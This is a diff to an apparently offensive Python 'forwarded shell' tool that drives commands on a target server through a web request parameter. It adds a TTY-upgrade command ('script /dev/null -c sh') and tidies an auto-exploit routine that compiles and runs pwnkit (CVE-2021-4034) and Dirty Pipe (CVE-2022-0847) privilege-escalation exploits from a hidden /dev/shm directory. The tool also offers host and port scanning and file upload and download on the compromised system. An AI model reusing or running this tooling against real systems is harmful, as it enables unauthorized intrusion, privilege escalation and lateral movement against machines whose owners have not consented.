@@ -26,7 +26,7 @@ mybanner = '''\n              /\                               ______,....----,
               \/'''
 
 # Global Variables
-global infile, outfile, mod
+global infile, outfile, mod, command_to_exec, tty, user, hostname
 mod = randrange(1, 9999)
 infile = f"/dev/shm/.fs/input.{mod}"
 outfile = f"/dev/shm/.fs/output.{mod}"
@@ -168,14 +168,9 @@ def tryExploits(url, parameter):
     command_to_exec = """gcc /dev/shm/.fs/cve-2021-4034.c -o /dev/shm/.fs/cve-2021-4034"""
     execCommand(url, parameter, command_to_exec + "\n")
 
-    command_to_exec = """chmod +x /dev/shm/.fs/cve-2022-0847"""
-    execCommand(url, parameter, command_to_exec + "\n")
-
-    command_to_exec = """chmod +x /dev/shm/.fs/cve-2021-4034"""
-    execCommand(url, parameter, command_to_exec + "\n")
-
     print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Executing exploits" + c.END)
     time.sleep(0.5)
+    # Dirty Pipe
     print(c.BLUE + "\nExecuting Dity Pipe exploit" + c.END)
     command_to_exec = """/dev/shm/.fs/cve-2022-0847"""
     execCommand(url, parameter, command_to_exec + "\n")
@@ -184,8 +179,8 @@ def tryExploits(url, parameter):
     resp = cleanHTML(resp)
     print(resp)
     clearOutput(url, parameter)
-
-    print(c.BLUE + "\nExecuting pwnkit exploit" + c.END)
+    # Pwnkit
+    print(c.BLUE + "Executing pwnkit exploit" + c.END)
     command_to_exec = """/dev/shm/.fs/cve-2021-4034"""
     execCommand(url, parameter, command_to_exec + "\n")
 
@@ -353,6 +348,19 @@ def portScan(url, parameter, ip):
 def cleanHTML(out):
     clean = re.compile('<.*?>')
     cleanout = re.sub(clean, '', out)
+    finalout = []
+    try:
+        if tty == 1:
+            cleanout = cleanout.split(f'\x00{command_to_exec}')[1]
+            cfile = open("/dev/shm/.clean", "w")
+            cfile.write(cleanout)
+            cfile.close()
+            
+            cleanout = open("/dev/shm/.clean", "r").read()
+            cleanout = "\n".join(cleanout.split("\n")[:-1])
+    except:
+        pass
+
     return cleanout
 
 # Main Function
@@ -380,7 +388,7 @@ if __name__ == '__main__':
 
     print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Type dfs-help to see a list of custom commands of this forwarded shell\n" + c.END)
 
-    customCommands = ["dfs-help", "help-dfs", "dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-exploit", "exploit-dfs", "dfs-exploits", "dfs-binaries", "binaries-dfs", "dfs-download", "download-dfs", "dfs-upload", "upload-dfs", "dfs-hostscan", "hostscan-dfs","dfs-portscan","portscan-dfs"]
+    customCommands = ["dfs-help", "help-dfs", "dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-exploit", "exploit-dfs", "dfs-exploits", "dfs-binaries", "binaries-dfs", "dfs-download", "download-dfs", "dfs-upload", "upload-dfs", "dfs-hostscan", "hostscan-dfs", "dfs-portscan", "portscan-dfs", "dfs-tty", "tty-dfs"]
     
     # Loop to execute commands
     while True:
@@ -394,12 +402,23 @@ if __name__ == '__main__':
             print(c.YELLOW + "--------\t\t-----------" + c.END)
             print(c.BLUE + "dfs-enum\t\tenumerate common things of the system (users, groups, system info...)" + c.END)
             print(c.BLUE + "dfs-binaries\t\tsearch common binaries that can be used in the pentest" + c.END)
+            print(c.BLUE + "dfs-tty\t\t\tcreate a interactive tty to have more power" + c.END)
             print(c.BLUE + "dfs-hostscan\t\tscan active hosts in a valid range (Example: 192.168.1)" + c.END)
             print(c.BLUE + "dfs-portscan\t\tscan 5000 ports over a ip (Example: 192.168.1.1)" + c.END)
             print(c.BLUE + "dfs-upload\t\tupload a file to the server" + c.END)
             print(c.BLUE + "dfs-download\t\tdownload the specified file from the server" + c.END)
             print(c.BLUE + "dfs-exploit\t\ttry to escalate privileges using some exploits (pwnkit, dirty pipe)" + c.END)
             print(c.BLUE + "dfs-exit\t\texit from the forwarded shell and delete created files on the target\n" + c.END)
+
+        if command_to_exec == "dfs-tty" or command_to_exec == "tty-dfs":
+            tty = 1
+            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Creating tty for a fully interactive shell" + c.END)
+
+            command_to_exec = """script /dev/null -c sh"""
+            execCommand(url, parameter, command_to_exec + "\n")
+            clearOutput(url, parameter)
+
+            print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Shell upgraded successfully\n" + c.END)
 
         if command_to_exec == "dfs-enum" or command_to_exec == "enum-dfs":
             print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Enumerating system, please wait a few seconds" + c.END)
@@ -506,12 +525,22 @@ if __name__ == '__main__':
             sys.exit(0)
 
         if command_to_exec not in customCommands and not command_to_exec.startswith("dfs-upload ") and not command_to_exec.startswith("dfs-download ") and not command_to_exec.startswith("dfs-hostscan ") and not command_to_exec.startswith('dfs-portscan '):
+            # Execute especified command
             execCommand(url, parameter, command_to_exec + "\n")
+
             # Read command output
             resp = readCommand(url, parameter)
+
             # Print command output
             resp = cleanHTML(resp)
-            print(resp)
+
+            # Check if tty is powered
+            try:
+                if tty == 1:
+                    print("\n" + resp.strip('\n') + "\n")
+            except:
+                print(resp)
+
             # Clear the file of the output
             clearOutput(url, parameter)
 
